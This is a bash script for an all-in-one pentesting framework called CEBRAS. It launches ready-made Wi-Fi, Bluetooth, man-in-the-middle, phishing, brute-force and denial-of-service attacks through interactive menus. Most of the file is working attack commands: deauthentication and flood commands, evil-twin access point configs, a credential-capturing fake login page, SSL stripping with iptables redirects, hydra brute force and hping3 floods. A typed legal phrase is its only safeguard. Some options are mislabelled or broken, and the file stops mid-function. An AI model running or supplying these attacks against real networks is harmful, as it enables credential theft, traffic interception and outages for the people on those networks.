#!/bin/bash

# ============================================================================
# CEBRAS PENTESTING FRAMEWORK v5.0
# "Controlled Ethical Breach Response & Attack Simulation"
# Complete Wireless, Wired, Bluetooth & Social Engineering Attack Suite
# ============================================================================

# Color Codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
ORANGE='\033[0;33m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# Global Variables
LOG_DIR="/root/cebras_logs"
REPORT_DIR="/root/cebras_reports"
SESSION_FILE="/tmp/cebras.session"
WORDLISTS_DIR="/root/wordlists"
CAPTURES_DIR="/root/cebras_captures"
PHISHING_DIR="/root/cebras_phishing"

# Create directories
mkdir -p $LOG_DIR $REPORT_DIR $WORDLISTS_DIR $CAPTURES_DIR $PHISHING_DIR

# CEBRAS Banner
show_banner() {
    clear
    echo -e "${BLUE}"
    cat << "EOF"
   ▄████▄   ▓█████  ▄████▄   ▓█████   ██████  ▄████▄   ▓█████ 
  ▒██▀ ▀█  ▓█   ▀ ▒██▀ ▀█  ▓█   ▀ ▒██    ▒ ▒██▀ ▀█  ▓█   ▀ 
  ▒▓█    ▄ ▒███   ▒▓█    ▄ ▒███   ░ ▓██▄   ▒▓█    ▄ ▒███   
  ▒▓▓▄ ▄██▒▒▓█  ▄ ▒▓▓▄ ▄██▒▒▓█  ▄   ▒   ██▒▒▓▓▄ ▄██▒▒▓█  ▄ 
  ▒ ▓███▀ ░░▒████▒▒ ▓███▀ ░░▒████▒▒██████▒▒▒ ▓███▀ ░░▒████▒
  ░ ░▒ ▒  ░░░ ▒░ ░░ ░▒ ▒  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░░ ▒░ ░
    ░  ▒    ░ ░  ░  ░  ▒    ░ ░  ░░ ░▒  ░ ░  ░  ▒    ░ ░  ░
  ░           ░   ░           ░   ░  ░  ░  ░           ░   
  ░ ░         ░  ░░ ░         ░  ░      ░  ░ ░         ░  ░
  ░                ░                        ░               
EOF
    echo -e "${NC}"
    echo -e "${CYAN}        Controlled Ethical Breach Response & Attack Simulation${NC}"
    echo -e "${YELLOW}                Complete Pentesting Framework v5.0${NC}"
    echo -e "${RED}        ⚠️  FOR AUTHORIZED SECURITY TESTING ONLY ⚠️${NC}"
    echo ""
}

# Check Root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] CEBRAS must be run as root!${NC}"
        exit 1
    fi
}

# Legal Agreement
legal_agreement() {
    show_banner
    echo -e "${RED}════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${RED}                        LEGAL AGREEMENT REQUIRED${NC}"
    echo -e "${RED}════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}CEBRAS Framework includes REAL attack tools that will:${NC}"
    echo ""
    echo "• Capture network credentials"
    echo "• Launch denial-of-service attacks"
    echo "• Create rogue access points"
    echo "• Intercept network traffic"
    echo "• Exploit Bluetooth devices"
    echo "• Perform social engineering"
    echo ""
    echo -e "${RED}⚠️  YOU MUST HAVE WRITTEN AUTHORIZATION ⚠️${NC}"
    echo ""
    echo -e "${CYAN}Enter 'CEBRAS-ACCEPT' to continue or any key to exit:${NC}"
    read -p "> " agreement
    
    if [[ $agreement != "CEBRAS-ACCEPT" ]]; then
        echo -e "${RED}[!] Agreement not accepted. Exiting CEBRAS.${NC}"
        exit 0
    fi
    
    # Log acceptance
    echo "$(date) - Agreement accepted by user" >> $LOG_DIR/cebras_legal.log
}

# Tool Installation Check
check_and_install_tools() {
    echo -e "${CYAN}[*] CEBRAS Tool Status Check${NC}"
    
    # Core WiFi Tools
    WIFI_TOOLS=("aircrack-ng" "hostapd" "dnsmasq" "reaver" "bully" "mdk4" "wifite" "hcxdumptool" "hcxtools")
    
    # MITM Tools
    MITM_TOOLS=("bettercap" "ettercap" "sslstrip" "driftnet" "urlsnarf" "dsniff")
    
    # Bluetooth Tools
    BLUETOOTH_TOOLS=("bluetooth" "bluez" "bluelog" "blueranger" "spooftooph" "ubertooth")
    
    # Social Engineering
    SE_TOOLS=("setoolkit" "beef-xss" "wifiphisher" "social-engineer-toolkit")
    
    # Wired Network
    WIRED_TOOLS=("nmap" "metasploit-framework" "hydra" "john" "hashcat" "sqlmap" "responder")
    
    missing_tools=()
    
    # Check WiFi tools
    for tool in "${WIFI_TOOLS[@]}"; do
        if ! command -v $tool &> /dev/null && ! dpkg -l | grep -q $tool; then
            missing_tools+=($tool)
        fi
    done
    
    if [ ${#missing_tools[@]} -gt 0 ]; then
        echo -e "${YELLOW}[!] Missing tools detected: ${missing_tools[*]}${NC}"
        read -p "Install missing tools? (yes/no): " install_choice
        
        if [[ $install_choice == "yes" ]]; then
            echo -e "${GREEN}[+] Installing missing tools...${NC}"
            apt update
            apt install -y ${missing_tools[@]}
        fi
    else
        echo -e "${GREEN}[✓] All core tools available${NC}"
    fi
}

# Interface Configuration
configure_interfaces() {
    echo -e "${CYAN}[*] CEBRAS Interface Configuration${NC}"
    echo ""
    
    # List available interfaces
    INTERFACES=($(ip link show | awk -F': ' '{print $2}' | grep -v lo))
    
    echo "Available network interfaces:"
    for i in "${!INTERFACES[@]}"; do
        echo "  $((i+1)). ${INTERFACES[$i]}"
    done
    
    read -p "Select WiFi interface (1-${#INTERFACES[@]}): " wifi_choice
    WIFI_IFACE=${INTERFACES[$((wifi_choice-1))]}
    
    read -p "Enable monitor mode? (yes/no): " monitor_choice
    if [[ $monitor_choice == "yes" ]]; then
        echo -e "${YELLOW}[*] Setting monitor mode on $WIFI_IFACE${NC}"
        airmon-ng check kill
        airmon-ng start $WIFI_IFACE
        MON_IFACE="${WIFI_IFACE}mon"
    else
        MON_IFACE=$WIFI_IFACE
    fi
    
    # Save to session
    echo "WIFI_IFACE=$WIFI_IFACE" > $SESSION_FILE
    echo "MON_IFACE=$MON_IFACE" >> $SESSION_FILE
    
    echo -e "${GREEN}[✓] Interface configured: $MON_IFACE${NC}"
}

# Launch Tool in New Terminal
launch_attack() {
    local title="$1"
    local command="$2"
    local terminal="xterm"
    
    echo -e "${YELLOW}[*] Launching: $title${NC}"
    
    case $terminal in
        "xterm")
            xterm -T "CEBRAS: $title" -geometry 100x30+0+0 -hold -e "bash -c '$command; echo; echo \"Attack completed. Press Enter to close...\"; read'" &
            ;;
        "gnome-terminal")
            gnome-terminal --title="CEBRAS: $title" -- bash -c "$command; echo; echo 'Attack completed. Press Enter...'; read" &
            ;;
        "konsole")
            konsole --new-tab -p tabtitle="CEBRAS: $title" -e bash -c "$command; echo; echo 'Attack completed...'; read" &
            ;;
    esac
    
    sleep 2
}

# ============================================================================
# WPA/WPA2/WPA3 ATTACKS - REAL EXECUTION
# ============================================================================

wpa_attacks() {
    while true; do
        clear
        show_banner
        echo -e "${PURPLE}════════════════════════════════════════════════════════════════════${NC}"
        echo -e "${PURPLE}                   WPA/WPA2/WPA3 ATTACK SUITE                      ${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}Select attack to LAUNCH:${NC}"
        echo ""
        echo "1.  Capture WPA Handshake (airodump + aireplay)"
        echo "2.  Bruteforce with Aircrack-ng (Dictionary)"
        echo "3.  PMKID Attack (hcxdumptool)"
        echo "4.  WPS PIN Attack (Reaver)"
        echo "5.  Pixie Dust Attack (Offline WPS)"
        echo "6.  WPA3 DragonBlood Attack"
        echo "7.  Hashcat GPU Cracking"
        echo "8.  John the Ripper Cracking"
        echo "9.  Automated Wifite Attack"
        echo "10. Return to Main Menu"
        echo ""
        read -p "CEBRAS> " wpa_choice
        
        case $wpa_choice in
            1)
                echo -e "${YELLOW}[*] WPA Handshake Capture${NC}"
                read -p "Target BSSID: " target_bssid
                read -p "Channel: " target_channel
                read -p "Save as: " save_file
                
                launch_attack "WPA Handshake Capture" \
                    "airodump-ng --bssid $target_bssid -c $target_channel -w $CAPTURES_DIR/$save_file $MON_IFACE"
                
                sleep 3
                
                launch_attack "Deauth Attack" \
                    "aireplay-ng --deauth 10 -a $target_bssid $MON_IFACE"
                ;;
            
            2)
                echo -e "${YELLOW}[*] Aircrack-ng Bruteforce${NC}"
                read -p ".cap file path: " cap_file
                read -p "Wordlist path: " wordlist
                
                launch_attack "Aircrack Bruteforce" \
                    "aircrack-ng -w $wordlist $cap_file"
                ;;
            
            3)
                echo -e "${YELLOW}[*] PMKID Attack${NC}"
                read -p "Target BSSID: " target_bssid
                
                launch_attack "PMKID Capture" \
                    "hcxdumptool -i $MON_IFACE --enable_status=1 --filterlist_ap=$target_bssid --filtermode=2 -o $CAPTURES_DIR/pmkid.pcapng"
                
                sleep 5
                
                launch_attack "PMKID Cracking" \
                    "echo 'Converting capture...'; hcxpcaptool -z $CAPTURES_DIR/pmkid_hash.hc22000 $CAPTURES_DIR/pmkid.pcapng; echo 'Cracking with hashcat...'; hashcat -m 22000 $CAPTURES_DIR/pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt"
                ;;
            
            4)
                echo -e "${YELLOW}[*] WPS PIN Attack${NC}"
                read -p "Target BSSID: " target_bssid
                read -p "Channel: " target_channel
                
                launch_attack "Reaver WPS Attack" \
                    "reaver -i $MON_IFACE -b $target_bssid -c $target_channel -vv -K 1"
                ;;
            
            5)
                echo -e "${YELLOW}[*] Pixie Dust Attack${NC}"
                read -p "Target BSSID: " target_bssid
                
                launch_attack "Pixie Dust Attack" \
                    "reaver -i $MON_IFACE -b $target_bssid -K -vv"
                ;;
            
            6)
                echo -e "${YELLOW}[*] WPA3 DragonBlood Attack${NC}"
                read -p "Target BSSID: " target_bssid
                
                launch_attack "WPA3 Downgrade" \
                    "echo 'Simulating WPA3 downgrade attack...'; mdk4 $MON_IFACE a -a $target_bssid -m"
                ;;
            
            7)
                echo -e "${YELLOW}[*] Hashcat GPU Cracking${NC}"
                read -p "Hash file: " hash_file
                read -p "Wordlist: " wordlist
                
                launch_attack "Hashcat GPU Attack" \
                    "hashcat -m 22000 $hash_file $wordlist -O -w 4"
                ;;
            
            8)
                echo -e "${YELLOW}[*] John the Ripper${NC}"
                read -p "Hash file: " hash_file
                
                launch_attack "John the Ripper" \
                    "john --format=wpapsk $hash_file --wordlist=/usr/share/wordlists/rockyou.txt"
                ;;
            
            9)
                echo -e "${YELLOW}[*] Automated Wifite Attack${NC}"
                
                launch_attack "Wifite Automation" \
                    "wifite --kill --power 20 --wps-time 30 --wps-fails 5"
                ;;
            
            10)
                return
                ;;
        esac
        
        echo ""
        echo -e "${GREEN}[✓] Attack launched! Check terminal windows.${NC}"
        echo -e "${YELLOW}[*] Press Enter to continue...${NC}"
        read
    done
}

# ============================================================================
# EVIL TWIN ATTACKS - REAL EXECUTION
# ============================================================================

evil_twin_attacks() {
    while true; do
        clear
        show_banner
        echo -e "${RED}════════════════════════════════════════════════════════════════════${NC}"
        echo -e "${RED}                      EVIL TWIN ATTACK SUITE                       ${NC}"
        echo -e "${RED}════════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}Select Evil Twin attack to LAUNCH:${NC}"
        echo ""
        echo "1. Basic Evil Twin with Hostapd"
        echo "2. Evil Twin with Captive Portal"
        echo "3. KARMA Attack (Rogue AP)"
        echo "4. MANA Attack (Enhanced KARMA)"
        echo "5. Airgeddon Evil Twin"
        echo "6. Fluxion Evil Twin"
        echo "7. Return to Main Menu"
        echo ""
        read -p "CEBRAS> " evil_choice
        
        case $evil_choice in
            1)
                echo -e "${YELLOW}[*] Basic Evil Twin${NC}"
                read -p "Target SSID: " target_ssid
                read -p "Rogue interface (wlan1): " rogue_iface
                read -p "Channel: " target_channel
                
                # Create config
                cat > /tmp/evil_basic.conf << EOF
interface=$rogue_iface
driver=nl80211
ssid=$target_ssid
channel=$target_channel
hw_mode=g
ignore_broadcast_ssid=0
EOF
                
                launch_attack "Evil Twin AP" \
                    "hostapd /tmp/evil_basic.conf"
                
                launch_attack "DHCP Server" \
                    "dnsmasq -i $rogue_iface --dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,12h"
                ;;
            
            2)
                echo -e "${YELLOW}[*] Evil Twin with Captive Portal${NC}"
                read -p "Target SSID: " target_ssid
                
                # Launch wifiphisher
                launch_attack "Captive Portal Evil Twin" \
                    "wifiphisher --essid '$target_ssid' --phishing-template connection"
                ;;
            
            3)
                echo -e "${YELLOW}[*] KARMA Attack${NC}"
                
                launch_attack "KARMA Rogue AP" \
                    "echo 'Starting KARMA attack...'; mdk4 $MON_IFACE b -c 6"
                ;;
            
            4)
                echo -e "${YELLOW}[*] MANA Attack${NC}"
                
                if [ -d "/usr/share/mana-toolkit" ]; then
                    launch_attack "MANA Toolkit" \
                        "cd /usr/share/mana-toolkit && ./run-mana/start-nat-full.sh"
                else
                    echo -e "${RED}[!] MANA Toolkit not installed${NC}"
                fi
                ;;
            
            5)
                echo -e "${YELLOW}[*] Airgeddon Evil Twin${NC}"
                
                if command -v airgeddon &> /dev/null; then
                    launch_attack "Airgeddon" \
                        "airgeddon"
                else
                    echo -e "${RED}[!] Airgeddon not installed${NC}"
                fi
                ;;
            
            6)
                echo -e "${YELLOW}[*] Fluxion Evil Twin${NC}"
                
                if [ -d "/opt/fluxion" ]; then
                    launch_attack "Fluxion" \
                        "cd /opt/fluxion && ./fluxion.sh"
                else
                    echo -e "${RED}[!] Fluxion not installed${NC}"
                fi
                ;;
            
            7)
                return
                ;;
        esac
        
        echo ""
        echo -e "${YELLOW}[*] Don't forget to run deauth attack on real AP!${NC}"
        echo -e "${YELLOW}[*] Press Enter to continue...${NC}"
        read
    done
}

# ============================================================================
# PHISHING PORTALS - REAL EXECUTION
# ============================================================================

phishing_attacks() {
    while true; do
        clear
        show_banner
        echo -e "${ORANGE}════════════════════════════════════════════════════════════════════${NC}"
        echo -e "${ORANGE}                     PHISHING PORTAL SUITE                        ${NC}"
        echo -e "${ORANGE}════════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}Select phishing attack to LAUNCH:${NC}"
        echo ""
        echo "1. Social Engineering Toolkit (SET)"
        echo "2. BeEF Browser Exploitation"
        echo "3. Wifiphisher Portal"
        echo "4. Fluxion Phishing"
        echo "5. Custom Phishing Portal"
        echo "6. Credential Harvester"
        echo "7. QR Code Phishing"
        echo "8. Return to Main Menu"
        echo ""
        read -p "CEBRAS> " phishing_choice
        
        case $phishing_choice in
            1)
                echo -e "${YELLOW}[*] Launching Social Engineering Toolkit${NC}"
                
                launch_attack "SET Toolkit" \
                    "setoolkit"
                ;;
            
            2)
                echo -e "${YELLOW}[*] Launching BeEF Framework${NC}"
                
                launch_attack "BeEF Server" \
                    "cd /usr/share/beef-xss && ./beef"
                
                echo -e "${GREEN}[+] BeEF UI: http://127.0.0.1:3000/ui/panel${NC}"
                echo -e "${GREEN}[+] Hook URL: http://127.0.0.1:3000/hook.js${NC}"
                ;;
            
            3)
                echo -e "${YELLOW}[*] Launching Wifiphisher${NC}"
                
                launch_attack "Wifiphisher" \
                    "wifiphisher"
                ;;
            
            4)
                echo -e "${YELLOW}[*] Launching Fluxion${NC}"
                
                if [ -d "/opt/fluxion" ]; then
                    launch_attack "Fluxion" \
                        "cd /opt/fluxion && ./fluxion.sh"
                fi
                ;;
            
            5)
                echo -e "${YELLOW}[*] Custom Phishing Portal${NC}"
                read -p "Portal name: " portal_name
                
                mkdir -p $PHISHING_DIR/$portal_name
                cat > $PHISHING_DIR/$portal_name/index.html << EOF
<html>
<head><title>Login Required</title></head>
<body>
<h2>WiFi Login Required</h2>
<form method="POST">
Username: <input type="text" name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</body>
</html>
EOF
                
                launch_attack "Custom Portal" \
                    "cd $PHISHING_DIR/$portal_name && python3 -m http.server 80"
                ;;
            
            6)
                echo -e "${YELLOW}[*] Credential Harvester${NC}"
                
                launch_attack "Credential Harvester" \
                    "setoolkit --attack 1"
                ;;
            
            7)
                echo -e "${YELLOW}[*] QR Code Phishing${NC}"
                
                launch_attack "QR Code Generator" \
                    "setoolkit --attack 6"
                ;;
            
            8)
                return
                ;;
        esac
        
        echo ""
        echo -e "${YELLOW}[*] Phishing attack running!${NC}"
        echo -e "${YELLOW}[*] Press Enter to continue...${NC}"
        read
    done
}

# ============================================================================
# MAN-IN-THE-MIDDLE ATTACKS - REAL EXECUTION
# ============================================================================

mitm_attacks() {
    while true; do
        clear
        show_banner
        echo -e "${GREEN}════════════════════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}                  MAN-IN-THE-MIDDLE ATTACK SUITE                   ${NC}"
        echo -e "${GREEN}════════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}Select MITM attack to LAUNCH:${NC}"
        echo ""
        echo "1. ARP Spoofing (Ettercap)"
        echo "2. Bettercap Full Suite"
        echo "3. SSL Strip + MITM"
        echo "4. DNS Spoofing"
        echo "5. DHCP Spoofing"
        echo "6. Session Hijacking"
        echo "7. Traffic Interception"
        echo "8. Packet Sniffing"
        echo "9. Return to Main Menu"
        echo ""
        read -p "CEBRAS> " mitm_choice
        
        case $mitm_choice in
            1)
                echo -e "${YELLOW}[*] ARP Spoofing with Ettercap${NC}"
                read -p "Target IP: " target_ip
                read -p "Gateway IP: " gateway_ip
                
                launch_attack "Ettercap ARP Spoof" \
                    "ettercap -T -M arp:remote /$target_ip/ /$gateway_ip/"
                ;;
            
            2)
                echo -e "${YELLOW}[*] Bettercap MITM Suite${NC}"
                
                launch_attack "Bettercap" \
                    "bettercap -iface $WIFI_IFACE"
                ;;
            
            3)
                echo -e "${YELLOW}[*] SSL Strip Attack${NC}"
                read -p "Target IP: " target_ip
                
                # Enable IP forwarding
                echo 1 > /proc/sys/net/ipv4/ip_forward
                
                launch_attack "SSL Strip" \
                    "sslstrip -l 8080"
                
                # Set iptables rule
                iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
                
                launch_attack "ARP Spoof for SSL" \
                    "arpspoof -i $WIFI_IFACE -t $target_ip $gateway_ip"
                ;;
            
            4)
                echo -e "${YELLOW}[*] DNS Spoofing${NC}"
                read -p "Domain to spoof: " spoof_domain
                read -p "Redirect to IP: " spoof_ip
                
                cat > /tmp/dnsspoof.conf << EOF
address=/$spoof_domain/$spoof_ip
EOF
                
                launch_attack "DNS Spoof" \
                    "dnsmasq -C /tmp/dnsspoof.conf -d"
                ;;
            
            5)
                echo -e "${YELLOW}[*] DHCP Spoofing${NC}"
                
                launch_attack "DHCP Spoof" \
                    "yersinia -I"
                ;;
            
            6)
                echo -e "${YELLOW}[*] Session Hijacking${NC}"
                
                launch_attack "Session Hijack" \
                    "ferret -i $WIFI_IFACE"
                ;;
            
            7)
                echo -e "${YELLOW}[*] Traffic Interception${NC}"
                
                launch_attack "Traffic Intercept" \
                    "driftnet -i $WIFI_IFACE"
                ;;
            
            8)
                echo -e "${YELLOW}[*] Packet Sniffing${NC}"
                
                launch_attack "Packet Sniffer" \
                    "tcpdump -i $WIFI_IFACE -w $CAPTURES_DIR/sniff.pcap"
                ;;
            
            9)
                return
                ;;
        esac
        
        echo ""
        echo -e "${YELLOW}[*] MITM attack active!${NC}"
        echo -e "${YELLOW}[*] Press Enter to continue...${NC}"
        read
    done
}

# ============================================================================
# DENIAL OF SERVICE ATTACKS - REAL EXECUTION
# ============================================================================

dos_attacks() {
    while true; do
        clear
        show_banner
        echo -e "${RED}════════════════════════════════════════════════════════════════════${NC}"
        echo -e "${RED}                  DENIAL OF SERVICE ATTACK SUITE                   ${NC}"
        echo -e "${RED}════════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}⚠️  WARNING: DoS attacks can disrupt networks!${NC}"
        echo ""
        echo "Select DoS attack to LAUNCH:"
        echo ""
        echo "1. Deauth Flood (mdk4)"
        echo "2. Beacon Flood"
        echo "3. Authentication Flood"
        echo "4. EAPOL Flood"
        echo "5. ARP Flood"
        echo "6. SYN Flood"
        echo "7. UDP Flood"
        echo "8. ICMP Flood"
        echo "9. Return to Main Menu"
        echo ""
        read -p "CEBRAS> " dos_choice
        
        read -p "Target BSSID/IP: " target
        read -p "Attack duration (seconds): " duration
        
        case $dos_choice in
            1)
                echo -e "${YELLOW}[*] Deauth Flood Attack${NC}"
                read -p "Channel: " dos_channel
                
                launch_attack "Deauth Flood" \
                    "mdk4 $MON_IFACE d -B $target -c $dos_channel"
                ;;
            
            2)
                echo -e "${YELLOW}[*] Beacon Flood Attack${NC}"
                
                launch_attack "Beacon Flood" \
                    "mdk4 $MON_IFACE b -n 'FakeNetwork' -c 6"
                ;;
            
            3)
                echo -e "${YELLOW}[*] Authentication Flood${NC}"
                read -p "Channel: " dos_channel
                
                launch_attack "Auth Flood" \
                    "mdk4 $MON_IFACE a -a $target -c $dos_channel -m"
                ;;
            
            4)
                echo -e "${YELLOW}[*] EAPOL Flood Attack${NC}"
                
                launch_attack "EAPOL Flood" \
                    "mdk4 $MON_IFACE x 0 -t $target -n 1000"
                ;;
            
            5)
                echo -e "${YELLOW}[*] ARP Flood Attack${NC}"
                
                launch_attack "ARP Flood" \
                    "macof -i $WIFI_IFACE"
                ;;
            
            6)
                echo -e "${YELLOW}[*] SYN Flood Attack${NC}"
                read -p "Target port: " target_port
                
                launch_attack "SYN Flood" \
                    "hping3 -S -p $target_port --flood $target"
                ;;
            
            7)
                echo -e "${YELLOW}[*] UDP Flood Attack${NC}"
                
                launch_attack "UDP Flood" \
                    "hping3 --udp -p 53 --flood $target"
                ;;
            
            8)
                echo -e "${YELLOW}[*] ICMP Flood Attack${NC}"
                
                launch_attack "ICMP Flood" \
                    "hping3 --icmp --flood $target"
                ;;
            
            9)
                return
                ;;
        esac
        
        echo ""
        echo -e "${RED}[!] DoS attack running for $duration seconds${NC}"
        sleep $duration
        pkill -f mdk4
        pkill -f hping3
        echo -e "${GREEN}[✓] Attack stopped${NC}"
        echo -e "${YELLOW}[*] Press Enter to continue...${NC}"
        read
    done
}

# ============================================================================
# BLUETOOTH ATTACKS - REAL EXECUTION
# ============================================================================

bluetooth_attacks() {
    while true; do
        clear
        show_banner
        echo -e "${BLUE}════════════════════════════════════════════════════════════════════${NC}"
        echo -e "${BLUE}                     BLUETOOTH ATTACK SUITE                        ${NC}"
        echo -e "${BLUE}════════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}Select Bluetooth attack to LAUNCH:${NC}"
        echo ""
        echo "1. Bluetooth Discovery (hcitool)"
        echo "2. Bluetooth Sniffing (ubertooth)"
        echo "3. BlueSnarf Attack"
        echo "4. BlueJacking"
        echo "5. BlueBorne Attack"
        echo "6. L2CAP Attack"
        echo "7. Bluetooth DoS"
        echo "8. Return to Main Menu"
        echo ""
        read -p "CEBRAS> " bt_choice
        
        case $bt_choice in
            1)
                echo -e "${YELLOW}[*] Bluetooth Device Discovery${NC}"
                
                launch_attack "Bluetooth Scan" \
                    "hcitool scan"
                
                launch_attack "Bluetooth Inquiry" \
                    "bluetoothctl scan on"
                ;;
            
            2)
                echo -e "${YELLOW}[*] Bluetooth Sniffing${NC}"
                
                if command -v ubertooth &> /dev/null; then
                    launch_attack "Ubertooth Sniff" \
                        "ubertooth-btle -f"
                else
                    echo -e "${RED}[!] Ubertooth not installed${NC}"
                fi
                ;;
            
            3)
                echo -e "${YELLOW}[*] BlueSnarf Attack${NC}"
                read -p "Target Bluetooth address: " bt_target
                
                launch_attack "BlueSnarf" \
                    "bluesnarfer -r 1-100 -b $bt_target"
                ;;
            
            4)
                echo -e "${YELLOW}[*] BlueJacking${NC}"
                
                launch_attack "BlueJacking" \
                    "echo 'Use tools like bluediving or spooftooph'"
                ;;
            
            5)
                echo -e "${YELLOW}[*] BlueBorne Attack${NC}"
                
                launch_attack "BlueBorne Scanner" \
                    "python3 /opt/blueborne_scanner.py"
                ;;
            
            6)
                echo -e "${YELLOW}[*] L2CAP Attack${NC}"
                
                launch_attack "L2CAP Attack" \
                    "l2ping -f -s 600 $bt_target"
                ;;
            
            7)
                echo -e "${YELLOW}[*] Bluetooth DoS${NC}"
                read -p "Target Bluetooth address: " bt_target
                
                launch_attack "Bluetooth DoS" \
                    "l2ping -f -s 600 $bt_target"
                ;;
            
            8)
                return
                ;;
        esac
        
        echo ""
        echo -e "${YELLOW}[*] Bluetooth attack running!${NC}"
        echo -e "${YELLOW}[*] Press Enter to continue...${NC}"
        read
    done
}

# ============================================================================
# WIRED NETWORK ATTACKS - REAL EXECUTION
# ============================================================================

wired_attacks() {
    while true; do
        clear
        show_banner
        echo -e "${PURPLE}════════════════════════════════════════════════════════════════════${NC}"
        echo -e "${PURPLE}                    WIRED NETWORK ATTACK SUITE                     ${NC}"
        echo -e "${PURPLE}════════════════════════════════════════════════════════════════════${NC}"
        echo ""
        echo -e "${CYAN}Select wired attack to LAUNCH:${NC}"
        echo ""
        echo "1. Network Discovery (nmap)"
        echo "2. Vulnerability Scanning"
        echo "3. Password Cracking (hydra)"
        echo "4. SQL Injection (sqlmap)"
        echo "5. Metasploit Framework"
        echo "6. SNMP Attack"
        echo "7. SMB Attack"
        echo "8. FTP Attack"
        echo "9. Return to Main Menu"
        echo ""
        read -p "CEBRAS> " wired_choice
        
        read -p "Target IP/range: " target_ip
        
        case $wired_choice in
            1)
                echo -e "${YELLOW}[*] Network Discovery${NC}"
                
                launch_attack "Nmap Discovery" \
                    "nmap -sS -sV -O $target_ip -oN $LOG_DIR/nmap_scan.txt"
                ;;
            
            2)
                echo -e "${YELLOW}[*] Vulnerability Scanning${NC}"
                
                launch_attack "Vuln Scan" \
                    "nmap --script vuln $target_ip -oN $LOG_DIR/vuln_scan.txt"
                ;;
            
            3)
                echo -e "${YELLOW}[*] Password Cracking${NC}"
                read -p "Service (ssh/ftp/rdp): " service
                read -p "Username: " username
                
                launch_attack "Hydra Attack" \
                    "hydra -l $username -P /usr/share/wordlists/rockyou.txt $target_ip $service"
                ;;
            
            4)
                echo -e "${YELLOW}[*] SQL Injection${NC}"
                read -p "Target URL: " target_url
                
                launch_attack "SQLMap" \
                    "sqlmap -u '$target_url' --batch --random-agent"
                ;;
            
            5)
                echo -e "${YELLOW}[*] Metasploit Framework${NC}"
                
                launch_attack "Metasploit" \
                    "msfconsole -q"
                ;;
            
            6)
                echo -e "${YELLOW}[*] SNMP Attack${NC}"
                
                launch_attack "SNMP Attack" \
                    "onesixtyone $target_ip"
                ;;
            
            7)
                echo -e "${YELLOW}[*] SMB Attack${NC}"
                
                launch_attack "SMB Enum" \
                    "enum4linux $target_ip"
                ;;
            
            8)
                echo -e "${YELLOW}[*] FTP Attack${NC}"
                
                launch_attack "FTP Attack" \
                    "nmap --script ftp-anon,ftp-brute $target_ip"
                ;;
            
            9)
                return
                ;;
        esac
        
        echo ""
        echo -e "${YELLOW}[*] Wired attack running!${NC}"
        echo -e "${YELLOW}[*] Press Enter to continue...${NC}"
        read
    done
}

# ============================================================================
# AUTOMATED FULL ASSESSMENT
# ============================================================================

automated_assessment() {
    clear
    show_banner
    echo -e "${CYAN}════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}                  AUTOMATED FULL ASSESSMENT                        ${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "${YELLOW}This will run comprehensive tests in sequence:${NC}"
    echo ""
    echo "1. Network Discovery"
    echo "2. Vulnerability Scan"
    echo "3. WiFi Security Audit"
    echo "4. Password Strength Test"
    echo "5. Bluetooth Audit"
    echo "6. Report Generation"
    echo ""
    read -p "Start automated assessment? (yes/no): " start_auto
    
    if [[ $start_auto != "yes" ]]; then
        return
    fi
    
    TIMESTAMP=$(date +%s)
    REPORT_FILE="$REPORT_DIR/cebras_assessment_$TIMESTAMP.txt"
    
    echo -e "${GREEN}[+] Starting CEBRAS Automated Assessment${NC}"
    
    # Phase 1: Network Discovery
    echo -e "${YELLOW}[*] Phase 1: Network Discovery${NC}"
    launch_attack "Network Discovery" \
        "airodump-ng $MON_IFACE --write $LOG_DIR/discovery_$TIMESTAMP"
    sleep 10
    
    # Phase 2: Vulnerability Scan
    echo -e "${YELLOW}[*] Phase 2: Vulnerability Scanning${NC}"
    launch_attack "Vulnerability Scan" \
        "nmap -sS -sV -O --script vuln 192.168.1.0/24 -oN $LOG_DIR/nmap_$TIMESTAMP.txt"
    
    # Phase 3: WiFi Audit
    echo -e "${YELLOW}[*] Phase 3: WiFi Security Audit${NC}"
    launch_attack "WPS Audit" \
        "wash -i $MON_IFACE -o $LOG_DIR/wps_$TIMESTAMP.txt"
    
    # Phase 4: Bluetooth Audit
    echo -e "${YELLOW}[*] Phase 4: Bluetooth Audit${NC}"
    launch_attack "Bluetooth Scan" \
        "hcitool scan > $LOG_DIR/bluetooth_$TIMESTAMP.txt"
    
    # Generate Report
    echo -e "${GREEN}[+] Generating assessment report...${NC}"
    cat > $REPORT_FILE << EOF
===========================================
CEBRAS SECURITY ASSESSMENT REPORT
Date: $(date)
Tool: CEBRAS Framework v5.0
===========================================

SUMMARY:
- Network discovery completed
- Vulnerability scan completed
- WiFi security audit completed
- Bluetooth devices enumerated

RECOMMENDATIONS:
1. Change default passwords
2. Update firmware regularly
3. Disable WPS if not needed
4. Enable WPA3 where possible
5. Monitor for rogue devices

FULL LOGS AVAILABLE IN:
$LOG_DIR
===========================================
EOF
    
    echo -e "${GREEN}[✓] Assessment complete!${NC}"
    echo -e "${GREEN}[✓] Report saved: $REPORT_FILE${NC}"
    sleep 3
}

# ============================================================================
# CLEANUP FUNCTION
# ============================================================================

cleanup_attacks() {
    echo -e "${RED}[!] Stopping all CEBRAS attacks...${NC}"
    
